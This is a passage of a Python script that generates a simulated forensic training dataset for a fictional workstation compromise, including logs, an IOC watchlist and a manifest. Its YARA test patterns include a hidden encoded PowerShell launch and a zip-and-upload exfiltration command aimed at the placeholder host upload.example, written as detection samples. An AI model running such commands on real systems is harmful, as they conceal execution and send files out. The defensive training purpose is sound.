            "notice": "SIMULATED DATA generated for the TraceForge training scenario",
            "exported_by": "ir-team",
            "timezone_note": "event_time values are local time with explicit UTC offset",
        },
        "events": events,
    }
    return (json.dumps(doc, indent=2) + "\n").encode("utf-8")


def build_watchlist(sample_sha256: str) -> bytes:
    buf = io.StringIO()
    w = csv.writer(buf, lineterminator="\n")
    w.writerow(["indicator", "type", "confidence", "source", "description"])
    w.writerow([C2_IP, "ipv4", "medium", "synthetic-intel-feed", "Infrastructure associated with fictional 'MSync' tooling (training data)"])
    w.writerow(["meridian-sync.example", "domain", "medium", "synthetic-intel-feed", "Domain family used by fictional 'MSync' tooling (training data)"])
    w.writerow([LURE_HOST, "domain", "low", "synthetic-intel-feed", "Lure hosting domain reported in a fictional phishing campaign"])
    w.writerow([sample_sha256, "sha256", "high", "synthetic-intel-feed", "SHA-256 of the synthetic 'Q3_Vendor_Invoice.pdf.exe' training sample"])
    return buf.getvalue().encode("utf-8")


YARA_TEST_PATTERNS = {
    "positive_synthetic_marker.txt": f"header\n{SYNTHETIC_MARKER}\nfooter\n",
    "positive_encoded_powershell.txt": "cmd /c powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA\n",
    "positive_staging_exfil.txt": "Compress-Archive -Path C:\\x\\* -DestinationPath C:\\t\\a.zip\nInvoke-WebRequest -Uri https://upload.example/u -Method Post -InFile C:\\t\\a.zip\n",
    "negative_plain_text.txt": "Quarterly report. Nothing suspicious here. powershell is mentioned once.\n",
}


SCENARIO_FILES = {
    # filename: (artifact_type, description)
    f"{HOST}_Security.evtx": ("windows_evtx", "Windows Security event log exported from the workstation"),
    f"{HOST}_System.evtx": ("windows_evtx", "Windows System event log exported from the workstation"),
    f"{HOST}_PowerShell-Operational.evtx": ("windows_evtx", "Microsoft-Windows-PowerShell/Operational event log"),
    f"Chrome_History_{USER}.sqlite": ("browser_history", "Chromium 'History' SQLite database for the user profile"),
    "fw-edge-01_connections.csv": ("csv_log", "Perimeter firewall connection log (UTC)"),
    "resolver_queries.log": ("text_log", "Internal DNS resolver query log (local time with offset)"),
    "edr_file_events.json": ("json_events", "EDR file telemetry export (local time with offset)"),
    SAMPLE_NAME: ("pe_executable", "Executable recovered from the user's Downloads folder (synthetic, inert)"),
    "MFS_ReportViewer.exe": ("pe_executable", "Known-good internal utility used as a control sample (synthetic, inert)"),
}


def generate(out: Path) -> dict:
    out.mkdir(parents=True, exist_ok=True)
    evidence = out / "evidence"
    evidence.mkdir(exist_ok=True)

    sample = build_suspicious_sample()
    sample_sha = hashlib.sha256(sample).hexdigest()
    files = {
        f"{HOST}_Security.evtx": build_security_log(),
        f"{HOST}_System.evtx": build_system_log(),
        f"{HOST}_PowerShell-Operational.evtx": build_powershell_log(),
        f"Chrome_History_{USER}.sqlite": build_chromium_history(len(sample), sample_sha),
        "fw-edge-01_connections.csv": build_firewall_csv(),
        "resolver_queries.log": build_dns_log(),
        "edr_file_events.json": build_edr_json(sample_sha, len(sample)),
        SAMPLE_NAME: sample,
        "MFS_ReportViewer.exe": build_benign_sample(),
    }
    manifest_files = []
    for name, data in files.items():
        (evidence / name).write_bytes(data)
        artifact_type, description = SCENARIO_FILES[name]
        manifest_files.append({
            "filename": name,
            "artifact_type": artifact_type,
            "size_bytes": len(data),
            "sha256": hashlib.sha256(data).hexdigest(),
            "description": description,
        })

    intel = out / "intel"
    intel.mkdir(exist_ok=True)
    (intel / "meridian_ioc_watchlist.csv").write_bytes(build_watchlist(sample_sha))

    patterns = out / "yara_test_patterns"
    patterns.mkdir(exist_ok=True)
    for name, content in YARA_TEST_PATTERNS.items():
        (patterns / name).write_text(content, encoding="utf-8")

    manifest = {
        "dataset": "Meridian Financial Services - suspected workstation compromise",
        "case_number": "MFS-IR-2026-0147",
        "synthetic": True,
        "notice": "ALL DATA IS SIMULATED. Hosts, users, IPs (RFC 5737), and domains (.example, RFC 2606) are fictional.",
        "generator": "dataset/generator/generate.py",
        "files": manifest_files,
    }
    (out / "manifest.json").write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    return manifest


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--out", type=Path, default=Path(__file__).resolve().parents[1] / "meridian")
    args = parser.parse_args(argv)
    manifest = generate(args.out)
    for f in manifest["files"]:
        print(f"{f['sha256']}  {f['size_bytes']:>9}  {f['filename']}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
